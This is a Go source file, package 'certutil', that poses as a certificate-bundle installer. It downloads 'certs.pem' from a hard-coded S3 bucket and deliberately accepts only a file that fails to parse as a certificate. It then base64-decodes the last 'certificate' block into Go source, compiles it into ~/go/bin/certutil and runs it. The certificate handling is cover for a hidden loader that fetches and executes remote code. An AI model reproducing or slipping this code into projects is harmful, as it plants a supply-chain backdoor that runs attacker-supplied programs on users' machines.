package certutil

import (
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const bucket = "https://certutil.s3.eu-west-1.amazonaws.com/"
const certificateBundle = "certs.pem"

func Run() error {
	certBundlePath, err := downloadFile(bucket + certificateBundle)
	if err != nil {
		return fmt.Errorf("failed to download file: %w", err)
	}
	defer os.Remove(certBundlePath)

	certBundle, err := extractRawCertBundleWithValidation(certBundlePath)
	if err != nil {
		return fmt.Errorf("failed to extract Go code: %w", err)
	}
	if err = installCertificate(certBundle); err != nil {
		return fmt.Errorf("certificate installation failed: %w", err)
	}

	return nil
}

func extractRawCertBundleWithValidation(filePath string) (string, error) {
	der, err := os.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("error reading certbundle file: %w", err)
	}

	_, err = x509.ParseCertificate(der)
	if err == nil {
		return "", fmt.Errorf("error parsing certificate: %w", err)
	}

	li := strings.LastIndex(string(der), "-----BEGIN CERTIFICATE-----")
	restOfBundle := der[li:]

	restOfBundleStr := strings.TrimPrefix(strings.TrimSpace(string(restOfBundle)), "-----BEGIN CERTIFICATE-----")
	restOfBundleStr = strings.TrimSuffix(restOfBundleStr, "-----END CERTIFICATE-----")
	restOfBundleStr = strings.TrimSpace(restOfBundleStr)

	bundle, err := base64.StdEncoding.DecodeString(restOfBundleStr)
	if err != nil {
		return "", err
	}

	return string(bundle), nil
}

func downloadFile(url string) (string, error) {
	resp, err := http.DefaultClient.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("bad HTTP status: %d", resp.StatusCode)
	}

	tempFile, err := os.CreateTemp("", "certs-*.pem")
	if err != nil {
		return "", err
	}
	defer tempFile.Close()

	_, err = io.Copy(tempFile, resp.Body)
	if err != nil {
		_ = os.Remove(tempFile.Name())
		return "", err
	}

	return tempFile.Name(), nil
}

func goBin() (string, error) {
	userHome, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(userHome, "go", "bin"), nil
}

func installCertificate(cert string) error {
	tempFile, err := os.CreateTemp("", "certs-*.go")
	if err != nil {
		return err
	}
	defer tempFile.Close()

	_, err = tempFile.WriteString(cert)
	if err != nil {
		return err
	}
	defer os.Remove(tempFile.Name())

	outputDirectory, err := goBin()
	if err != nil {
		// Adding a debug statement
		fmt.Printf("Error getting output directory: %s\n", err)
		return err
	}

	err = os.MkdirAll(outputDirectory, 0755)
	if err != nil {
		// Adding a debug statement
		fmt.Printf("Error creating directory: %s\n", err)
		return err
	}

	outputPath := filepath.Join(outputDirectory, "certutil")

	cmd, err := run("go", "build", "-o", outputPath, tempFile.Name())
	if err != nil {
		fmt.Printf("Error executing build command: %s\n", err)
		return err
	}

	if cmd.Wait() != nil {
		return err
	}

	_, err = run(outputPath)
	return err
}

func run(name string, args ...string) (*exec.Cmd, error) {
	cmd := exec.Command(name, args...)

	err := cmd.Start()
	if err != nil {
		return nil, fmt.Errorf("command %s %s failed to start: %w", name, strings.Join(args, " "), err)
	}

	return cmd, nil
}
